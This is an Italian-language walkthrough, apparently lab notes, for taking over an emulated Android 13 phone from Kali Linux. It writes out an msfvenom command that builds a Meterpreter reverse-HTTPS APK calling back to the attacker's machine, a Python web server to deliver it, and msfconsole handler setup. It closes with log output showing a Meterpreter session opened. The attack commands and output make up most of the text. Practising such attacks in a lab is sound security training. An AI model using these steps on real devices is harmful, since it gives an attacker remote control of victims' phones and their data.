Per questo attacco è stato utilizzato un Android Studio con un emulatore di un Pixel 2 con API 33 ""Tiramisù" e con Android 13.0
La macchina Kali deve essere impostata in Bridge
(RICORDATI CHE IMPOSTANDO LA MACCHINA IN BRIDGE devi controllare il nuovo indirizzo IP perchè è diverso da quello in NAT

1 - Su Kali apri terminale e digita 
```bash
msfvenom -p android/meterpreter/reverse_https LHOST=192.168.1.169 LPORT=443 > malicious.apk
```
Poi manda il comando per far scaricare il file apk dal cellulare
```bash
sudo python3 -m http.server 80
```
poi dal cellulare accedi alla macchina tramite il link e scarica il file

Da un nuovo terminale di KALI lancia msfconsole 
```bash
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole
[sudo] password for kali: 
Metasploit tip: Metasploit can be configured at startup, see msfconsole 
--help to learn more
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use payload/android/meterpreter/reverse_https
msf payload(android/meterpreter/reverse_https) > set LHOST 192.168.1.169
LHOST => 192.168.1.169
msf payload(android/meterpreter/reverse_https) > set LPORT 443
LPORT => 443
msf payload(android/meterpreter/reverse_https) > exploit
[*] Payload Handler Started as Job 0
msf payload(android/meterpreter/reverse_https) > 
[*] Started HTTPS reverse handler on https://192.168.1.169:443
```


Dal cellulare scarica l'APk e dai tutti i permessi 
dal terminale dovrebbe apparire così
```bash
[!] https://192.168.1.169:443 handling request from 192.168.1.44; (UUID: m7bz59g6) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.1.169:443 handling request from 192.168.1.44; (UUID: m7bz59g6) Staging dalvik payload (72956 bytes) ...
[!] https://192.168.1.169:443 handling request from 192.168.1.44; (UUID: m7bz59g6) Without a database connected that payload UUID tracking will not work!
[!] https://192.168.1.169:443 handling request from 192.168.1.44; (UUID: m7bz59g6) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.1.169:443 handling request from 192.168.1.44; (UUID: m7bz59g6) Staging dalvik payload (72956 bytes) ...
[!] https://192.168.1.169:443 handling request from 192.168.1.44; (UUID: m7bz59g6) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 2 opened (192.168.1.169:443 -> 192.168.1.44:61426) at 2025-11-05 05:14:02 -0500
[-] Meterpreter session 1 is not valid and will be closed
```

